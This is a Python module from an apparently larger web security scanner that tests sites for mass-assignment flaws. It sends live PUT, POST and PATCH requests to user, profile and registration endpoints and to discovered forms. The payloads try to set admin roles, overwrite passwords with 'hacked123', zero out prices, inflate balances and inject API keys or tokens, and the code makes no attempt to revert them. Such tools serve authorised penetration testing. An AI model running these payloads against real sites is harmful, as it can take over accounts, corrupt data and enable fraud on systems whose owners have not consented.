import json
import re
from urllib.parse import urljoin, urlparse
from modules.base import BaseModule
from core.utils import random_string


class MassassignModule(BaseModule):
    name = "massassign"
    description = "Mass Assignment / Hidden Parameter Injection Scanner"
    
    dangerous_params = {
        "role": ["admin", "administrator", "root", "superuser", "moderator"],
        "is_admin": ["true", "1", "yes"],
        "isAdmin": ["true", "1", "yes"],
        "admin": ["true", "1", "yes"],
        "is_superuser": ["true", "1", "yes"],
        "is_staff": ["true", "1", "yes"],
        "isStaff": ["true", "1", "yes"],
        "user_type": ["admin", "administrator"],
        "userType": ["admin", "administrator"],
        "type": ["admin", "administrator"],
        "access_level": ["admin", "10", "999"],
        "accessLevel": ["admin", "10", "999"],
        "permission": ["admin", "all", "*"],
        "permissions": ["admin", "all", "*"],
        "group": ["admin", "administrators"],
        "groups": ["admin", "administrators"],
        "verified": ["true", "1"],
        "is_verified": ["true", "1"],
        "isVerified": ["true", "1"],
        "active": ["true", "1"],
        "is_active": ["true", "1"],
        "isActive": ["true", "1"],
        "approved": ["true", "1"],
        "enabled": ["true", "1"],
        "banned": ["false", "0"],
        "is_banned": ["false", "0"],
        "balance": ["999999", "1000000"],
        "credits": ["999999", "1000000"],
        "discount": ["100", "1.0", "999"],
        "price": ["0", "0.01", "-1"],
        "id": ["1", "0"],
        "user_id": ["1", "0"],
        "userId": ["1", "0"],
        "created_at": ["2020-01-01"],
        "updated_at": ["2099-12-31"],
        "password": ["hacked123"],
        "password_hash": ["$2b$12$fakehash"],
        "api_key": ["injected_key"],
        "secret": ["injected_secret"],
        "token": ["injected_token"],
    }
    
    target_endpoints = [
        "/api/user", "/api/users", "/api/profile", "/api/account", "/api/settings",
        "/api/v1/user", "/api/v1/users", "/api/v1/profile",
        "/user", "/users", "/profile", "/account", "/settings",
        "/register", "/signup", "/update-profile",
    ]
    
    async def scan(self, target):
        self.findings = []
        base_url = self._get_base_url(target)
        
        for endpoint in self.target_endpoints:
            url = urljoin(base_url, endpoint)
            await self._test_endpoint(url)
        
        await self._test_endpoint(target)
        await self._test_forms(target)
        
        return self.findings
    
    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    async def _test_endpoint(self, url):
        resp = await self.http.get(url)
        
        if resp.get("status") not in [200, 201, 400, 401, 403, 405]:
            return
        
        canary = random_string(12)
        
        baseline_put = await self.http.put(url, json={"test": canary})
        baseline_post = await self.http.post(url, json={"test": canary})
        baseline_patch = await self.http.patch(url, json={"test": canary})
        
        for param, values in self.dangerous_params.items():
            for value in values:
                json_payload = {param: value, "_canary": canary}
                
                if baseline_put.get("status") in [200, 201, 204, 400]:
                    result = await self._test_injection(url, "PUT", json_payload, param, value)
                    if result:
                        return
                
                if baseline_post.get("status") in [200, 201, 204, 400]:
                    result = await self._test_injection(url, "POST", json_payload, param, value)
                    if result:
                        return
                
                if baseline_patch.get("status") in [200, 201, 204, 400]:
                    result = await self._test_injection(url, "PATCH", json_payload, param, value)
                    if result:
                        return
    
    async def _test_injection(self, url, method, payload, param, value):
        if method == "PUT":
            resp = await self.http.put(url, json=payload)
        elif method == "POST":
            resp = await self.http.post(url, json=payload)
        elif method == "PATCH":
            resp = await self.http.patch(url, json=payload)
        else:
            return False
        
        if not resp.get("status"):
            return False
        
        text = resp.get("text", "")
        status = resp.get("status")
        
        if param in text and value in text:
            if "error" not in text.lower() and "invalid" not in text.lower():
                self.add_finding(
                    "HIGH",
                    f"Mass Assignment - {param} Accepted",
                    url=url,
                    parameter=param,
                    evidence=f"Parameter {param}={value} reflected in response via {method}"
                )
                return True
        
        try:
            data = json.loads(text)
            if self._find_in_dict(data, param, value):
                self.add_finding(
                    "CRITICAL",
                    f"Mass Assignment - {param} Injected Successfully",
                    url=url,
                    parameter=param,
                    evidence=f"Field {param}={value} appears in JSON response"
                )
                return True
        except:
            pass
        
        if status in [200, 201, 204]:
            text_lower = text.lower()
            if param.lower() not in text_lower:
                if any(x in text_lower for x in ["success", "updated", "saved", "created"]):
                    self.add_finding(
                        "MEDIUM",
                        f"Mass Assignment - {param} May Be Accepted",
                        url=url,
                        parameter=param,
                        evidence=f"No error when sending {param}={value} via {method}"
                    )
                    return True
        
        return False
    
    def _find_in_dict(self, data, key, value):
        if isinstance(data, dict):
            for k, v in data.items():
                if k.lower() == key.lower():
                    if str(v).lower() == str(value).lower():
                        return True
                if isinstance(v, (dict, list)):
                    if self._find_in_dict(v, key, value):
                        return True
        elif isinstance(data, list):
            for item in data:
                if self._find_in_dict(item, key, value):
                    return True
        return False
    
    async def _test_forms(self, target):
        resp = await self.http.get(target)
        if resp.get("status") != 200:
            return
        
        text = resp.get("text", "")
        
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
        forms = re.findall(form_pattern, text, re.IGNORECASE)
        
        field_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        existing_fields = re.findall(field_pattern, text, re.IGNORECASE)
        
        self.log(f"[MassAssign] Found {len(forms)} forms, {len(existing_fields)} fields")
        
        base_url = self._get_base_url(target)
        
        for form_action in forms:
            form_url = urljoin(base_url, form_action) if form_action else target
            
            payload = {field: "test_value" for field in existing_fields[:5]}
            
            for param, values in list(self.dangerous_params.items())[:10]:
                payload[param] = values[0]
            
            resp = await self.http.post(form_url, data=payload)
            
            if resp.get("status") in [200, 201, 302]:
                text = resp.get("text", "").lower()
                
                for param in list(self.dangerous_params.keys())[:10]:
                    if param.lower() in text:
                        if "error" not in text and "invalid" not in text:
                            self.add_finding(
                                "MEDIUM",
                                f"Form May Accept Hidden Parameter: {param}",
                                url=form_url,
                                parameter=param,
                                evidence=f"Parameter {param} reflected after form submission"
                            )
                            break
